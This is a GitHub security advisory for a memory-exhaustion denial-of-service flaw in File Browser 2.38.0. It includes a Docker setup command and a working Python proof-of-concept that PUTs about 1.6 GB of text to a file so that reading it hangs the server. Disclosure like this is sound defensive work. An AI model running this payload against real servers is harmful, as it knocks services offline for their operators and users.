# [H] File Browser's Uncontrolled Memory Consumption vulnerability can enable DoS attack due to oversized file processing

## Summary
Severity: High
Advisory: GHSA-7xqm-7738-642x
CVE: CVE-2025-53893
CWE: CWE-400, CWE-789
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2025-07-16
Source: https://github.com/advisories/GHSA-7xqm-7738-642x
Type: github-advisory

## Affected
- Go: `github.com/filebrowser/filebrowser/v2` — affected 2.38.0

## Details
### Summary

A Denial of Service (DoS) vulnerability exists in the file processing logic when reading a file on endpoint  `Filebrowser-Server-IP:PORT/files/{file-name}` . While the server correctly handles and stores uploaded files, it attempts to load the entire content into memory during read operations without size checks or resource limits. This allows an authenticated user to upload a large file and trigger uncontrolled memory consumption on read, potentially crashing the server and making it unresponsive.

### Details

The endpoint ` /api/resources/{file-name}` accepts `PUT` requests with plain text file content. Uploading an extremely large file (e.g., ~1.5 GB) succeeds without issue. However, when the server attempts to open and read this file, it performs the read operation in an unbounded or inefficient way, leading to excessive memory usage.

This approach attempts to read the entire file into memory at once. For large files, this causes memory exhaustion resulting in a crash or serious performance degradation. In the filebrowser codebase, this can be due to:
- Lack of memory-safe streaming or chunked reading during file processing.
- Absence of validation or size limits during the read phase.
- Possibly synchronous or blocking file parsing without protection.

### PoC
0. I run the project via docker (latest version, 2.38.0) using the following command found in the documentation:

```
docker run \
    -v filebrowser_data:/srv \
    -v filebrowser_database:/database \
    -v filebrowser_config:/config \
    -p 8080:80 \
    filebrowser/filebrowser```
```

1. First login in your filebrowser and create a simple empty file eg. name it `another`
2. We will add a large data into this file via `PUT` method on the api by running the following `Python` script (as an exploit PoC script)

```python
import requests

url = "http://filebrowser-server-IP:8080/api/resources/another"
auth_token = "eyJh-auth-token-goes-here"
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": "http://filebrowser-server-IP:8080/files/another",
    "X-Auth": auth_token,
    "Content-Type": "text/plain;charset=UTF-8",
    "Origin": "http://filebrowser-server-IP:8080",
    "Connection": "close",
    "Priority": "u=0"
}

# Generate a very large string into a file (e.g 1.6 GB)

base = "testing data goes here\n"
repeat_count = 120_000_000  

data = base * repeat_count

print("Sending large payload...")
response = requests.put(url, headers=headers, data=data)

# Output the response
print(f"Status Code: {response.status_code}")
print("Response Body:")
print(response.text)
```

3. After running this script, go back in your filebrowser dashboard and try to open the file `another` - try to read the content in this file. The file will open on another tab and it will hang there consuming memory and resources. The entire server will remain unresponsive until the entire file loads (takes long time)


### Impact
Denial of Service

### Evidence
<img width="2191" height="350" alt="Pasted image (4)" src="https://github.com/user-attachments/assets/98af76ad-0714-40a9-a92b-b2d4a5941ab7" />


<img width="2012" height="1039" alt="Pasted image (2)" src="https://github.com/user-attachments/assets/d1ba3282-6c4d-4d35-81c7-87d4e0274f85" />

## References
- https://github.com/filebrowser/filebrowser/security/advisories/GHSA-7xqm-7738-642x
- https://nvd.nist.gov/vuln/detail/CVE-2025-53893
- https://github.com/filebrowser/filebrowser/issues/5294
- https://github.com/filebrowser/filebrowser
